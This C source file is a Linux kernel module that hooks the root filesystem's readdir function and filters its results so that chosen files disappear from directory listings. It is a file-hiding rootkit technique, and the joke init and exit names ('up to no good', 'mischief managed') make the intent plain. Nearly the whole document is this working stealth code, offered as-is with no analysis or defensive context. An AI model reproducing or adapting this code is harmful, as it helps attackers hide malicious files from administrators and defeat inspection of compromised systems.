#include "common.h"
#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

#define MYFILE "Makefile"
#define TMPSZ 150

static int (*root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);


struct s_file_args {
    char *name;
    unsigned short namelen;
};

struct hidden_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

void *get_vfs_read ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->read;

    filp_close(filep, 0);

    return ret;
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( name == hf->name )
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
	{
		#if __DEBUG_HOOK__
		printk("namelen: %d\thook name: %s\tfile name: %s\n", namelen, hf->name, name);
		#endif
		if ( ! strcmp(name, hf->name) )
            return 0;
	}
		
    return o_root_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_root_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    if ( ! file || ! file->f_vfsmnt ) // XXX is this necessary?
        return 0;

    o_root_filldir = filldir;

    hijack_pause(root_readdir);
    ret = root_readdir(file, dirent, &n_root_filldir);
    hijack_resume(root_readdir);

    return ret;
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{
    /* Hook / for hiding files and directories */
    root_readdir = get_vfs_readdir("/");
    hijack_start(root_readdir, &n_root_readdir);
	hide_file(MYFILE);
	
    return 0;
}

static void __exit mischief_managed ( void )
{

    hijack_stop(root_readdir);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
